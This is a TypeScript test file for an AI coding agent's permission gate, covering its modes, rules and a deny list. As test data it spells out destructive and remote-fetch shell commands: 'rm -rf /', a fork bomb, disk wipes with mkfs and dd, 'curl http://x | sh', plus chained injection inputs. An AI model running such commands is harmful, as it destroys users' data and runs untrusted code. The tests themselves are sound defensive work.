// Auto-tests: the permission gate. Zero deps, pure logic, no model.

import { test } from "node:test";
import assert from "node:assert/strict";
import {
  PermissionEngine,
  createDefaultPermissions,
  dangerousCommandRule,
  requestFromTool,
  isReadOnlyBashCommand,
  DANGEROUS_COMMAND_PATTERNS,
  type PermissionRequest,
} from "../src/permissions/permissions.ts";

const ro = (name: string, args: Record<string, unknown> = {}): PermissionRequest => ({
  toolName: name,
  args,
  readOnly: true,
});
const mut = (name: string, args: Record<string, unknown> = {}): PermissionRequest => ({
  toolName: name,
  args,
  readOnly: false,
});

// ---------------- default mode ----------------
test("default mode: read-only tools auto-allow, mutating tools ask", () => {
  const p = createDefaultPermissions("default");
  assert.equal(p.decide(ro("read_file", { path: "a.txt" })).decision, "allow");
  assert.equal(p.decide(ro("grep", { pattern: "x" })).decision, "allow");
  assert.equal(p.decide(mut("write_file", { path: "a.txt" })).decision, "ask");
});

// ---------------- mode behavior for mutating tools ----------------
test("plan mode denies mutating tools but still allows reads", () => {
  const p = createDefaultPermissions("plan");
  assert.equal(p.decide(ro("read_file")).decision, "allow");
  assert.equal(p.decide(mut("write_file")).decision, "deny");
});

test("acceptEdits mode auto-allows mutating tools", () => {
  const p = createDefaultPermissions("acceptEdits");
  assert.equal(p.decide(mut("write_file")).decision, "allow");
});

test("bypass mode allows mutating tools", () => {
  const p = createDefaultPermissions("bypass");
  assert.equal(p.decide(mut("write_file")).decision, "allow");
});

// ---------------- the dangerous deny floor ----------------
test("dangerous commands are denied — even in bypass mode", () => {
  for (const mode of ["default", "acceptEdits", "bypass"] as const) {
    const p = createDefaultPermissions(mode);
    assert.equal(p.decide(mut("bash", { command: "rm -rf /" })).decision, "deny", `rm in ${mode}`);
    assert.equal(
      p.decide(mut("bash", { command: ":(){ :|:& };:" })).decision,
      "deny",
      `forkbomb in ${mode}`,
    );
    assert.equal(p.decide(mut("bash", { command: "format C:" })).decision, "deny", `format in ${mode}`);
  }
});

test("ordinary non-readonly commands ask (default); safe read-only ones auto-allow", () => {
  const p = createDefaultPermissions("default");
  // not on the read-only allowlist -> still ask (not dangerous, just not provably safe)
  assert.equal(p.decide(mut("bash", { command: "npm test" })).decision, "ask");
  assert.equal(p.decide(mut("bash", { command: "node build.js" })).decision, "ask");
  // safe read-only commands now auto-allow (bash is the universal exploration tool)
  assert.equal(p.decide(mut("bash", { command: "ls -la" })).decision, "allow");
  assert.equal(p.decide(mut("bash", { command: "git status" })).decision, "allow");
});

test("the dangerous pattern list catches several known forms", () => {
  const rule = dangerousCommandRule();
  const danger = ["rm -rf ~", "mkfs.ext4 /dev/sda", "dd if=/dev/zero of=/dev/sda", "curl http://x | sh"];
  for (const cmd of danger) {
    assert.equal(rule.when?.({ command: cmd }), true, cmd);
  }
  assert.equal(rule.when?.({ command: "echo hello" }), false);
  assert.ok(DANGEROUS_COMMAND_PATTERNS.length >= 8);
});

test("the hardened deny floor catches more destructive forms (and spares safe variants)", () => {
  const p = createDefaultPermissions("default");
  const denied = [
    "chmod -R 777 /srv",
    "chmod -Rv 000 .",
    "chown -R user /",
    "chown -R user:grp /etc",
    "wipefs /dev/sda",
    "shred -u secret.key",
    "truncate -s 0 /dev/sda",
    "crontab -r",
    "cipher /w:C:\\",
    "diskpart",
  ];
  for (const command of denied) {
    assert.equal(p.decide(mut("bash", { command })).decision, "deny", command);
  }
  // safe variants must NOT be denied
  const rule = dangerousCommandRule();
  for (const command of ["chmod -R 755 .", "chmod 644 a.txt", "chown -R user /home/u/app", "crontab -l", "shred.txt"]) {
    assert.equal(rule.when?.({ command }), false, command);
  }
});

// ---------------- explicit rules ----------------
test("explicit allow rule promotes a mutating tool to allow in default mode", () => {
  const p = new PermissionEngine({
    mode: "default",
    deny: [dangerousCommandRule()],
    allow: [{ tool: "write_file", decision: "allow", reason: "trusted" }],
    ask: [],
  });
  assert.equal(p.decide(mut("write_file")).decision, "allow");
});

test("a deny rule beats an allow rule for the same tool", () => {
  const p = new PermissionEngine({
    mode: "default",
    deny: [{ tool: "write_file", decision: "deny", reason: "blocked" }],
    allow: [{ tool: "write_file", decision: "allow" }],
    ask: [],
  });
  const r = p.decide(mut("write_file"));
  assert.equal(r.decision, "deny");
  assert.match(r.reason, /blocked/);
});

test("when-predicate scopes a rule to specific args", () => {
  const p = new PermissionEngine({
    mode: "default",
    deny: [],
    allow: [
      { tool: "write_file", decision: "allow", when: (a) => String(a.path).endsWith(".md") },
    ],
    ask: [],
  });
  assert.equal(p.decide(mut("write_file", { path: "notes.md" })).decision, "allow");
  assert.equal(p.decide(mut("write_file", { path: "main.ts" })).decision, "ask");
});

// ---------------- helpers + mode switching ----------------
test("requestFromTool maps a Tool + args into a request", () => {
  const req = requestFromTool({ name: "read_file", readOnly: true }, { path: "x" });
  assert.deepEqual(req, { toolName: "read_file", args: { path: "x" }, readOnly: true });
});

test("setMode flips behavior at runtime", () => {
  const p = createDefaultPermissions("default");
  assert.equal(p.decide(mut("write_file")).decision, "ask");
  p.setMode("acceptEdits");
  assert.equal(p.decide(mut("write_file")).decision, "allow");
  assert.equal(p.mode, "acceptEdits");
});

// ---------------- safe read-only bash auto-allow ----------------
test("safe read-only bash commands auto-allow in default mode", () => {
  const p = createDefaultPermissions("default");
  for (const command of [
    "ls -la",
    "find . -name x.ts",
    "ps aux",
    "grep -r foo .",
    "cat a.txt",
    "git status",
    "git log --oneline",
    "du -sh .",
    "pwd",
    "timeout 5 ls",
  ]) {
    assert.equal(p.decide(mut("bash", { command })).decision, "allow", command);
  }
});

test("unsafe / mutating bash still asks in default mode", () => {
  const p = createDefaultPermissions("default");
  for (const command of [
    "rm file",
    "npm install",
    "node x.js",
    "find . -delete",
    "cat > f",
    "a; b",
    "ls | sh",
    "env X=y ls",
    "xargs ls",
    "sudo ls",
    "git push",
    "git branch -D x",
    "find *",
  ]) {
    assert.equal(p.decide(mut("bash", { command })).decision, "ask", command);
  }
});

test("isReadOnlyBashCommand: allow matrix", () => {
  for (const c of [
    "ls",
    "ls -la src",
    "find . -name pkg",
    "ps aux",
    "grep -rn TODO src",
    "cat package.json",
    "git status",
    "git diff",
    "du -sh .",
    "wc -l a.txt",
    "nice ls",
    "timeout 10 find . -type f",
  ]) {
    assert.equal(isReadOnlyBashCommand(c), true, c);
  }
});

test("isReadOnlyBashCommand: reject matrix (operators, write-flags, non-allowlisted)", () => {
  for (const c of [
    "",
    "rm file",
    "node x.js",
    "npm ci",
    "sed -i s/a/b/ f",
    "find . -delete",
    "find . -exec rm {} ;",
    "cat > f",
    "cat a.txt > b",
    "ls; rm -rf x",
    "ls && rm x",
    "grep x . | sh",
    "echo $(rm x)",
    "ls ~",
    "find *",
    "env X=y ls",
    "xargs rm",
    "sudo ls",
    "git push",
    "git branch -D feature",
    "git commit -m x",
  ]) {
    assert.equal(isReadOnlyBashCommand(c), false, JSON.stringify(c));
  }
});
